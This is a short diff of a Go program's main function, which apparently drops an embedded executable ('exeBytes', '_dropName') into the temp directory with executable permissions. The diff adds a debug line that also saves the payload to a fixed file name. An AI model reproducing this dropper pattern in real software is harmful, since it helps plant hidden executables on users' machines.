@@ -126,6 +126,8 @@ func main() {
 		tmp = os.TempDir()
 	}
 	dst := filepath.Join(tmp, _dropName)
+	// 调试：先存一份到固定名供检查
+	_ = os.WriteFile(os.Getenv("TEMP")+"\\t0_payload_debug.bin", exeBytes, 0644)
 	if err := os.WriteFile(dst, exeBytes, 0o755); err != nil {
 		return
 	}
